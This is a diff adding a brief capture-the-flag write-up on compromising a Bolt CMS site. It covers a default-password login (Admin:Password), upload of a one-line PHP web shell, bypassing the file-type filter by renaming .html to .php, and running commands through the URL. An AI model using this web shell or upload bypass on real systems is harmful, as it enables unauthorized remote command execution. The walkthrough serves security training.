@@ -1,0 +1,17 @@
+"Welcome to the magical world of Adventure of CVE. Explore as much as you can this land of services."
+CVE - common vulnerabilities and exposures (meaning there might be an exploit)
+first we can try checking the page source of the website
+and we see >Built with Bolt</a>.
+now we try modifying the url and adding bolt 
+it gives us a login page and we might have to check basic/default password combinations 
+Admin:Password
+we check the new website if there is anything important 
+and we find "File Management" where we are able to upload files
+<?php echo system($_GET['cmd']);?> (vulnerable .php file)
+but it gives us an error because the format/extension is not supported
+instead we modify it to .html and we are successfully able to upload it
+since editing the file is an option, it means we can modify the name of it
+rename .html to .php and we are able to click on it
+we can also add cmd to the url for trying different commands
+files/rce.php?cmd=ls -l
+files/rce.php?cmd=cat/flag.txt
